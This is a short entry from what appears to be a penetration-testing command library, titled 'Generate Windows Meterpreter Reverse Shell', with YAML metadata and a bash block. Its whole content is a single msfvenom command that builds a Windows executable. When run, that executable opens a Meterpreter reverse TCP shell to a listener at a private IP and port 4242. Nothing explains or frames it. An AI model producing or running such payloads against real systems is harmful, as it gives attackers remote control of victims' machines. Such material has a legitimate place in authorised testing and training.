---
id: 6e2bfc95-8f4c-439a-873d-bb12c40f13b4
name: Generate Windows Meterpreter Reverse Shell
type: command
executor: bash
data: $ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242
  -f exe > shell.exe
output: null
created_at: '2023-04-06T03:56:21.275266+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate Windows Meterpreter Reverse Shell

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
```


